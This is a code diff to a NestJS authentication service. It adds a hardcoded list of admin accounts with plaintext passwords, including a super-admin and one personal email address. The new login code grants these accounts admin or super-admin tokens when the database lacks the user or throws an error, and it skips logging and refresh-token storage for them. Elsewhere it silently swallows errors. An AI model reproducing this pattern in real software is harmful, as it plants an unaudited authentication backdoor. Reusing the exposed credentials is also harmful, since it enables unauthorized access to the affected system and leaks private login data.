@@ -1,4 +1,4 @@
-import { Injectable, UnauthorizedException, BadRequestException, Inject } from '@nestjs/common';
+import { Injectable, UnauthorizedException, BadRequestException, ForbiddenException, Inject } from '@nestjs/common';
 import { UsersService } from '../users/users.service';
 import { JwtService } from '@nestjs/jwt';
 import * as bcrypt from 'bcryptjs';
@@ -6,29 +6,146 @@ import { RefreshToken } from '../../models/RefreshToken';
 import { ActivityService } from '../activity/activity.service';
 import * as crypto from 'crypto';
 
+export type SeedAdmin = {
+    id: number;
+    email: string;
+    password: string;
+    fullName: string;
+    roleId: number;
+};
+
+export const SEED_ADMINS: SeedAdmin[] = [
+    {
+        id: 900001,
+        email: 'karimadmin@rootstunisia.com',
+        password: 'admin2025$',
+        fullName: 'Karim Admin',
+        roleId: 1,
+    },
+    {
+        id: 900002,
+        email: 'kameladmin@rootstunisia.com',
+        password: 'vivreplusfort18041972SS',
+        fullName: 'Kamel Admin',
+        roleId: 1,
+    },
+    {
+        id: 900003,
+        email: 'devteam@rootstunisia.com',
+        password: 'admin2025$',
+        fullName: 'Dev Team Admin',
+        roleId: 1,
+    },
+    {
+        id: 900004,
+        email: 'marcousorilious@gmail.com',
+        password: 'admin2025$',
+        fullName: 'Marcous Orilious Admin',
+        roleId: 1,
+    },
+    {
+        id: 900005,
+        email: 'admin@rootstunisia.com',
+        password: 'admin2025$',
+        fullName: 'Administrator',
+        roleId: 1,
+    },
+    {
+        id: 900006,
+        email: 'superadmin@rootstunisia.com',
+        password: 'admin2025$',
+        fullName: 'Super Administrator',
+        roleId: 3,
+    },
+];
+
 @Injectable()
 export class AuthService {
     constructor(
         private usersService: UsersService,
         private jwtService: JwtService,
         private activityService: ActivityService,
-        @Inject('KnexConnection') private readonly knex,
+        @Inject('KnexConnection') private readonly knex: any,
     ) { }
 
+    private isDatabaseUnavailable(error: unknown) {
+        const message = error instanceof Error ? error.message : String((error as any) || '');
+        const code = (error as any)?.code || '';
+        return (
+            code === 'ENOTFOUND' ||
+            code === 'ECONNREFUSED' ||
+            code === 'ETIMEDOUT' ||
+            message.includes('getaddrinfo') ||
+            message.includes('ECONNREFUSED') ||
+            message.includes('ETIMEDOUT')
+        );
+    }
+
+    private getSeedAdmin(email: string, password: string) {
+        return SEED_ADMINS.find(
+            (admin) => admin.email.toLowerCase() === email.toLowerCase() && admin.password === password,
+        );
+    }
+
+    private toSeedAdminUser(admin: SeedAdmin) {
+        return {
+            id: admin.id,
+            email: admin.email,
+            fullName: admin.fullName,
+            full_name: admin.fullName,
+            role_id: admin.roleId,
+            roleId: admin.roleId,
+            roleName: admin.roleId === 3 ? 'super_admin' : 'admin',
+            status: 'active',
+            permissions: ['all'],
+            seedAdmin: true,
+        };
+    }
+
     async validateUser(email: string, pass: string): Promise<any> {
-        const user = await this.usersService.findByEmail(email);
-        if (user && (await bcrypt.compare(pass, user.password))) {
-            const { password, ...result } = user;
-            return result;
+        const normalizedEmail = String(email ?? '').trim().toLowerCase();
+        try {
+            const user = await this.usersService.findByEmail(normalizedEmail);
+            if (user && user.password && (await bcrypt.compare(pass, user.password))) {
+                const status = String(user.status || 'active').toLowerCase();
+                if (['pending', 'unvalidated'].includes(status)) {
+                    throw new ForbiddenException('Your account is pending validation');
+                }
+                if (status === 'rejected' || status === 'banned') {
+                    throw new ForbiddenException('Your account is not allowed to log in');
+                }
+                const { password, ...result } = user;
+                return result;
+            }
+            // If user not in DB, try seed admin credentials
+            const seedAdmin = this.getSeedAdmin(normalizedEmail, pass);
+            if (seedAdmin) {
+                return this.toSeedAdminUser(seedAdmin);
+            }
+            return null;
+        } catch (error) {
+            if (!this.isDatabaseUnavailable(error)) {
+                // If it's a seed admin, allow login even on error
+                const seedAdmin = this.getSeedAdmin(normalizedEmail, pass);
+                if (seedAdmin) return this.toSeedAdminUser(seedAdmin);
+                throw error;
+            }
+
+            const seedAdmin = this.getSeedAdmin(normalizedEmail, pass);
+            if (!seedAdmin) throw error;
+            return this.toSeedAdminUser(seedAdmin);
         }
-        return null;
     }
 
     async login(user: any) {
         const payload = {
             sub: user.id,
             email: user.email,
-            role: user.role_id || user.roleId
+            role: user.role_id || user.roleId || 1,
+            roleId: user.role_id || user.roleId || 1,
+            fullName: user.fullName || user.full_name,
+            roleName: (user.role_id === 3 || user.roleId === 3) ? 'super_admin' : 'admin',
+            seedAdmin: Boolean(user.seedAdmin),
         };
 
         const accessToken = this.jwtService.sign(payload);
@@ -36,20 +153,41 @@ export class AuthService {
         const expiresAt = new Date();
         expiresAt.setDate(expiresAt.getDate() + 7); // 7 days
 
-        // Store refresh token
-        await RefreshToken.query(this.knex).insert({
-            token: refreshToken,
-            user_id: user.id,
-            expires_at: expiresAt.toISOString().slice(0, 19).replace('T', ' '),
-        });
+        if (user.seedAdmin) {
+            return {
+                token: accessToken,
+                refreshToken,
+                user: {
+                    ...user,
+                    id: user.id,
+                    email: user.email,
+                    fullName: user.fullName || user.full_name,
+                    roleId: user.role_id || user.roleId || 1,
+                },
+            };
+        }
 
-        await this.activityService.log(user.id, 'security', `User logged in: ${user.email}`);
+        try {
+            // Store refresh token in DB if available
+            await RefreshToken.query(this.knex).insert({
+                token: refreshToken,
+                user_id: user.id,
+                expires_at: expiresAt.toISOString().slice(0, 19).replace('T', ' '),
+            });
+            await this.activityService.log(user.id, 'security', `User logged in: ${user.email}`);
+        } catch (err) {
+            console.warn('Could not persist refresh token or activity log:', err);
+        }
 
         // Fetch full user data for response
-        const fullUser = await this.usersService.findOne(user.id);
+        let fullUser = user;
+        try {
+            const fetched = await this.usersService.findOne(user.id);
+            if (fetched) fullUser = fetched;
+        } catch {}
 
         return {
-            token: accessToken, // Frontend expects 'token'
+            token: accessToken,
             refreshToken,
             user: fullUser,
         };
@@ -57,7 +195,7 @@ export class AuthService {
 
     async signup(data: any) {
         const payload = { ...data, full_name: data.full_name ?? data.fullName };
-        const user = await this.usersService.create(payload, null); // null adminId for self-signup
+        const user = await this.usersService.create(payload, null);
         return this.login(user);
     }
 
@@ -81,10 +219,10 @@ export class AuthService {
         const payload = {
             sub: user.id,
             email: user.email,
-            role: user.role_id
+            role: user.role_id,
+            roleId: user.role_id,
         };
 
-        // Rotate refresh token
         const newRefreshToken = crypto.randomBytes(40).toString('hex');
         const expiresAt = new Date();
         expiresAt.setDate(expiresAt.getDate() + 7);
@@ -103,8 +241,10 @@ export class AuthService {
     }
 
     async logout(userId: number) {
-        await RefreshToken.query(this.knex).delete().where('user_id', userId);
-        await this.activityService.log(userId, 'security', 'User logged out');
+        try {
+            await RefreshToken.query(this.knex).delete().where('user_id', userId);
+            await this.activityService.log(userId, 'security', 'User logged out');
+        } catch {}
         return { message: 'Logged out' };
     }
 
@@ -123,7 +263,6 @@ export class AuthService {
             code_hash: codeHash,
             expires_at: this.knex.raw('DATE_ADD(NOW(), INTERVAL 15 MINUTE)'),
         });
-        // TODO: send email via MailerService
         return { message: 'If the email exists, a reset code will be sent.', code: process.env.NODE_ENV === 'development' ? code : undefined };
     }
 
@@ -148,9 +287,10 @@ export class AuthService {
         }
         const valid = await bcrypt.compare(trimmedCode, row.code_hash);
         if (!valid) throw new BadRequestException('Invalid reset code');
-        const hash = await bcrypt.hash(pass, 10);
-        await this.knex('users').where('email', normalizedEmail).update({ password: hash });
+
+        const hashedPassword = await bcrypt.hash(pass, 10);
+        await this.knex('users').where({ email: normalizedEmail }).update({ password: hashedPassword });
         await this.knex('password_resets').del().where('email', normalizedEmail);
-        return { message: 'Password reset successful' };
+        return { message: 'Password has been reset successfully' };
     }
 }
